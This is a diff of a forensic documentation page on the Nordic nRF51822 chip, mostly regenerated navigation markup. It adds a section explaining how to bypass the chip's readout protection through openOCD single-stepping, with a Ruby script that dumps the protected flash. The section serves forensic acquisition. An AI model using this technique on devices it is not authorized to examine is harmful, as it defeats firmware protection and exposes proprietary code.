@@ -25,27 +25,19 @@
   
 
   
-  
     <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
-  
-
-  
-
-  
-        <link rel="index" title="Index"
-              href="../../genindex.html"/>
-        <link rel="search" title="Search" href="../../search.html"/>
-    <link rel="top" title="Hardware Forensic Database 1.0 documentation" href="../../index.html"/>
-        <link rel="up" title="Nordic Semiconductor SoCs" href="../nordic-semi.html"/>
-        <link rel="next" title="Nordic Semiconductor NRF52832 SoC" href="nrf52832.html"/>
-        <link rel="prev" title="Nordic Semiconductor SoCs" href="../nordic-semi.html"/> 
+  <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" />
+    <link rel="next" title="Nordic Semiconductor NRF52832 SoC" href="nrf52832.html" />
+    <link rel="prev" title="Nordic Semiconductor SoCs" href="../nordic-semi.html" /> 
 
   
   <script src="../../_static/js/modernizr.min.js"></script>
 
 </head>
 
-<body class="wy-body-for-nav" role="document">
+<body class="wy-body-for-nav">
 
    
   <div class="wy-grid-for-nav">
@@ -62,7 +54,7 @@
 
           
             
-            <img src="../../_static/logo.png" class="logo" />
+            <img src="../../_static/logo.png" class="logo" alt="Logo"/>
           
           </a>
 
@@ -88,19 +80,90 @@
             
             
               <ul class="current">
-<li class="toctree-l1"><a class="reference internal" href="../../howto.html">How to use the HFDB</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../../methodology.html">IoT-related forensic methodology</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../howto.html">How to use the HFDB</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../howto.html#specific-forensic-methodologies">Specific Forensic Methodologies</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../howto.html#specific-forensic-tools">Specific Forensic Tools</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../../methodology.html">IoT-related forensic methodology</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../methodology.html#context">Context</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../methodology.html#proposed-methodology">Proposed methodology</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../methodology.html#i-evaluate-the-device">I.  Evaluate the device</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../methodology.html#i-1-is-the-device-powered-on">I.1. Is the device powered on ?</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../methodology.html#i-2-determine-the-device-power-state">I.2. Determine the device power state</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../methodology.html#i-3-collect-information-about-the-device">I.3. Collect information about the device</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../methodology.html#ii-live-analysis-of-a-device">II. Live analysis of a device</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../methodology.html#ii-1-using-the-device-s-features-to-collect-data">II.1. Using the device's features to collect data</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../methodology.html#ii-2-hot-wiring-a-device">II.2. Hot wiring a device</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../methodology.html#ii-3-exploiting-a-vulnerability-to-gain-access">II.3. Exploiting a vulnerability to gain access</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../methodology.html#ii-4-extracting-data-from-an-active-device-live-acquisition">II.4. Extracting data from an active device (live acquisition)</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../methodology.html#iii-create-bit-stream-copies-of-storage-medias">III. Create bit-stream copies of storage medias</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../methodology.html#iii-1-extracting-data-from-internal-flash">III.1. Extracting data from internal flash</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../methodology.html#iii-2-extracting-data-from-external-flash">III.2. Extracting data from external flash</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../methodology.html#iii-3-extracting-data-from-classic-storage-medias">III.3. Extracting data from classic storage medias</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
 <li class="toctree-l1"><a class="reference internal" href="../../toolbox.html">Forensic toolbox</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../../devices.html">List of supported devices</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../devices.html">List of supported devices</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../devices.html#f">F</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../devices/fora_gms.html">Fora Bluetooth Glucose Monitoring System</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../devices/fora_gms.html#forensic-summary">Forensic Summary</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../devices/fora_gms.html#device-evaluation">Device evaluation</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../devices/fora_gms.html#extracting-valuable-information">Extracting valuable information</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../devices.html#s">S</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../devices/sricam.html">Sricam IP Camera</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../devices/sricam.html#forensic-summary">Forensic Summary</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../devices/sricam.html#accessing-the-serial-port">Accessing the Serial Port</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../devices/sricam.html#serial-port-configuration">Serial port configuration</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../devices/sricam.html#extract-information-from-memory">Extract information from memory</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../devices.html#t">T</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../devices/thequicklock.html">TheQuickLock padlock</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../devices/thequicklock.html#forensic-summary">Forensic Summary</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../devices/thequicklock.html#device-evaluation">Device evaluation</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../devices/thequicklock.html#accessing-the-soc">Accessing the SoC</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../devices/thequicklock.html#extracting-data-from-memory">Extracting data from memory</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../devices/thequicklock.html#extracting-the-event-log-and-the-pin-code">Extracting the event log and the PIN code</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../devices.html#v">V</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../devices/vachette_entr.html">Vachette ENTR smartlock</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
 <li class="toctree-l1 current"><a class="reference internal" href="../../cpumcu.html">List of supported MCUs/CPUs</a><ul class="current">
 <li class="toctree-l2 current"><a class="reference internal" href="../../cpumcu.html#forensic-summaries">Forensic summaries</a><ul class="current">
-<li class="toctree-l3"><a class="reference internal" href="../atmel.html">Atmel</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../atmel.html">Atmel</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="../atmel/atmegax8.html">ATMegaX8 family</a></li>
+</ul>
+</li>
 <li class="toctree-l3 current"><a class="reference internal" href="../nordic-semi.html">Nordic Semiconductor</a><ul class="current">
 <li class="toctree-l4 current"><a class="current reference internal" href="#">nRF51822</a></li>
 <li class="toctree-l4"><a class="reference internal" href="nrf52832.html">nRF52832</a></li>
 </ul>
 </li>
-<li class="toctree-l3"><a class="reference internal" href="../ti.html">Texas Instruments</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../ti.html">Texas Instruments</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="../ti/cc254x.html">CC254x family</a></li>
+</ul>
+</li>
 </ul>
 </li>
 </ul>
@@ -116,7 +179,7 @@
     <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
 
       
-      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+      <nav class="wy-nav-top" aria-label="top navigation">
         
           <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
           <a href="../../index.html">Hardware Forensic Database</a>
@@ -126,7 +189,9 @@
 
       
       <div class="wy-nav-content">
+        
         <div class="rst-content">
+        
           
 
 
@@ -159,7 +224,7 @@
       <li class="wy-breadcrumbs-aside">
         
             
-            <a href="../../_sources/cpumcus/nordic-semi/nrf51822.rst.txt" rel="nofollow"> View page source</a>
+            <a href="../../_sources/cpumcus/nordic-semi/nrf51822.txt" rel="nofollow"> View page source</a>
           
         
       </li>
@@ -176,7 +241,7 @@
 <h1>Nordic Semiconductor NRF51822 SoC<a class="headerlink" href="#nordic-semiconductor-nrf51822-soc" title="Permalink to this headline">¶</a></h1>
 <div class="section" id="summary">
 <h2>Summary<a class="headerlink" href="#summary" title="Permalink to this headline">¶</a></h2>
-<table border="1" class="docutils">
+<table class="table table-bordered">
 <colgroup>
 <col width="29%" />
 <col width="50%" />
@@ -250,7 +315,7 @@ halt
 </div>
 <div class="section" id="protections">
 <h3>Protections<a class="headerlink" href="#protections" title="Permalink to this headline">¶</a></h3>
-<p>Nordic’s NRF51 architecture provides three level of protection through its ReadOut Protection mechanism.</p>
+<p>Nordic's NRF51 architecture provides three level of protection through its ReadOut Protection mechanism.</p>
 <div class="section" id="rdp-level-0">
 <h4>RDP level 0<a class="headerlink" href="#rdp-level-0" title="Permalink to this headline">¶</a></h4>
 <p>ReadOut Protection is disabled,  <strong>Flash memory is fully open and all memory operations are
@@ -282,14 +347,79 @@ or 0.</strong></p>
 </div></blockquote>
 </div>
 </div>
+<div class="section" id="bypassing-firmware-extraction-controls">
+<h3>Bypassing Firmware Extraction Controls<a class="headerlink" href="#bypassing-firmware-extraction-controls" title="Permalink to this headline">¶</a></h3>
+<p>This was originally published by <cite>Include Security &lt;http://blog.includesecurity.com/2015/11/NordicSemi-ARM-SoC-Firmware-dumping-technique.html&gt;</cite> where they demonstrated that the RDP on the nRF51822 could be bypassed by the following method:</p>
+<ol class="arabic simple">
+<li>Ensure that the device has debug enabled and is halted (for openOCD this is <code class="code docutils literal"><span class="pre">reset</span> <span class="pre">halt</span></code>)</li>
+<li>Locate a load instruction of the form <code class="code docutils literal"><span class="pre">ldr</span> <span class="pre">rN</span> <span class="pre">[</span> <span class="pre">rM</span> <span class="pre">#0</span> <span class="pre">]</span></code></li>
+</ol>
+<blockquote>
+<div><ul class="simple">
+<li>Such an instruction reads an address from a register (rM) and loads the data from that address into another register (rN), the #0 is an offset of zero
+e.g. <code class="code docutils literal"><span class="pre">ldr</span> <span class="pre">r3</span> <span class="pre">[</span> <span class="pre">r4,</span> <span class="pre">#0</span> <span class="pre">]</span></code> would load the data at memory address held in r4 into the r3 register</li>
+<li>A method for iterating through the code in openOCD is given in the above link</li>
+</ul>
+</div></blockquote>
+<ol class="arabic simple">
+<li>Using openOCD, set the register value of the address you want to dump into the relevant register in your target code (you can also set the PC) and then run <code class="code docutils literal"><span class="pre">step</span></code> to step through the instruction. You now have the value at the desired address in the register you want.</li>
+<li>Iterate this using a script to dump the full firmware</li>
+</ol>
+<p>An example in Ruby taken from the above article is here:</p>
+<div class="highlight-ruby"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env ruby</span>
+
+<span class="nb">require</span> <span class="s1">&#39;net/telnet&#39;</span>
+
+<span class="n">debug</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">Telnet</span><span class="o">::</span><span class="kp">new</span><span class="p">(</span><span class="s2">&quot;Host&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;localhost&quot;</span><span class="p">,</span>
+                         <span class="s2">&quot;Port&quot;</span> <span class="o">=&gt;</span> <span class="mi">4444</span><span class="p">)</span>
+
+<span class="n">dumpfile</span> <span class="o">=</span> <span class="no">File</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&quot;dump.bin&quot;</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">)</span>
+
+<span class="p">((</span><span class="mh">0x00000000</span><span class="o">/</span><span class="mi">4</span><span class="p">)</span><span class="o">...</span><span class="p">(</span><span class="mh">0x00040000</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">i</span><span class="o">|</span>
+  <span class="n">address</span> <span class="o">=</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">4</span>
+  <span class="n">debug</span><span class="o">.</span><span class="n">cmd</span><span class="p">(</span><span class="s2">&quot;reset halt&quot;</span><span class="p">)</span>
+  <span class="n">debug</span><span class="o">.</span><span class="n">cmd</span><span class="p">(</span><span class="s2">&quot;step&quot;</span><span class="p">)</span>
+  <span class="n">debug</span><span class="o">.</span><span class="n">cmd</span><span class="p">(</span><span class="s2">&quot;reg r3 0x</span><span class="si">#{</span><span class="n">address</span><span class="o">.</span><span class="n">to_s</span> <span class="mi">16</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+  <span class="n">debug</span><span class="o">.</span><span class="n">cmd</span><span class="p">(</span><span class="s2">&quot;step&quot;</span><span class="p">)</span>
+  <span class="n">response</span> <span class="o">=</span> <span class="n">debug</span><span class="o">.</span><span class="n">cmd</span><span class="p">(</span><span class="s2">&quot;reg r3&quot;</span><span class="p">)</span>
+  <span class="n">value</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="sr">/: 0x([0-9a-fA-F]{8})/</span><span class="p">)</span><span class="o">[</span><span class="mi">1</span><span class="o">].</span><span class="n">to_i</span> <span class="mi">16</span>
+  <span class="n">dumpfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="o">[</span><span class="n">value</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">))</span>
+  <span class="nb">puts</span> <span class="s2">&quot;0x%08x:  0x%08x&quot;</span> <span class="o">%</span> <span class="o">[</span><span class="n">address</span><span class="p">,</span> <span class="n">value</span><span class="o">]</span>
+<span class="k">end</span>
+
+<span class="n">dumpfile</span><span class="o">.</span><span class="n">close</span>
+<span class="n">debug</span><span class="o">.</span><span class="n">close</span>
+</pre></div>
+</td></tr></table></div>
+</div>
 </div>
 </div>
 
 
            </div>
-           <div class="articleComments">
-            
-           </div>
+           
           </div>
           <footer>
   
@@ -329,10 +459,11 @@ or 0.</strong></p>
         var DOCUMENTATION_OPTIONS = {
             URL_ROOT:'../../',
             VERSION:'1.0',
+            LANGUAGE:'None',
             COLLAPSE_INDEX:false,
             FILE_SUFFIX:'.html',
             HAS_SOURCE:  true,
-            SOURCELINK_SUFFIX: '.txt'
+            SOURCELINK_SUFFIX: ''
         };
     </script>
       <script type="text/javascript" src="../../_static/jquery.js"></script>
@@ -346,14 +477,13 @@ or 0.</strong></p>
     <script type="text/javascript" src="../../_static/js/theme.js"></script>
   
 
-  
-  
   <script type="text/javascript">
       jQuery(function () {
-          SphinxRtdTheme.StickyNav.enable();
+          
+          SphinxRtdTheme.Navigation.enableSticky();
+          
       });
-  </script>
-   
+  </script> 
 
 </body>
 </html>
